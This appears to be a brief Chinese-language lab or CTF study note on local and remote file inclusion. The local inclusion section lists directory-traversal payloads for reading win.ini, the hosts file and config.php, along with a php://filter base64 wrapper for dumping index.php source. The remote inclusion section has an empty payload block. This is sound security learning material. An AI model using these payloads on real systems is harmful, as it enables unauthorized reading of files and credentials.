### 本地文件包含

![[Pasted image 20260625114929.png]]

	分析：这个题目知识考察是目录遍历+文件包含的，可以逐步试试本地里面的一些固定的，敏感的文件信息。

**构建payload
```text
../../../../.../windows/win.ini
../../../../.../windows/system32/drivers/etc/hosts 
../../../config.php
php://filter/convert.base64-encode/resource=index.php
```

![[Pasted image 20260626105957.png]]

	分析：这里进行了5次目录跳级，从这个网站的根目录跳了出去，如果报错了，就加一次尝试即可。


## 远程文件包含

	前置：按照要求把这个关掉！！

![[Pasted image 20260626110055.png]]
这样即可
![[Pasted image 20260626110326.png]]

**构造payload
```text

```